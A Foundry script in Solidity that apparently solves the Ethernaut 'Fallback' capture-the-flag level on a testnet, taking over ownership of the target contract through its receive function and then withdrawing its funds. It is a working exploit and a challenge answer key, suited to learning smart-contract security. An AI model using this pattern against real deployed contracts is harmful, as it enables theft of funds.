// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Fallback} from "../src/Fallback.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Fallback.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

contract FallbackSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("FALLBACK_INSTANCE"));

    Fallback fallbackInstance = Fallback(payable(instance));
    function run() external {


        /** Attack idea:
            notice that the fallback function is called when the contract receives ether and it set the owner to the sender
            we can skip the contribute function and directly send ether to the contract to become the owner
            but first we need to have some contribution also to be able to pass the verification in the receive function
            this is achive by sending ether to the contract address with transfer function or call function with value
         */
        
        vm.startBroadcast(deployerPrivateKey);
        // contribute to the contract to have some contribution to be able to pass the verification in the receive function
        fallbackInstance.contribute{value: 1 wei}();

        // send ether to the contract to become the owner
        // since we can send any amount of ether we want, we can send 1 wei to become the owner (the minimum amount of ether that can be sent)
        (bool success, ) =  address(fallbackInstance).call{value: 1 wei}("");
        require(success, "Failed to send ether to the contract");
        // after sending the ether, we should be the owner of the contract so we can call the withdraw function
        fallbackInstance.withdraw();
        vm.stopBroadcast();
    }

}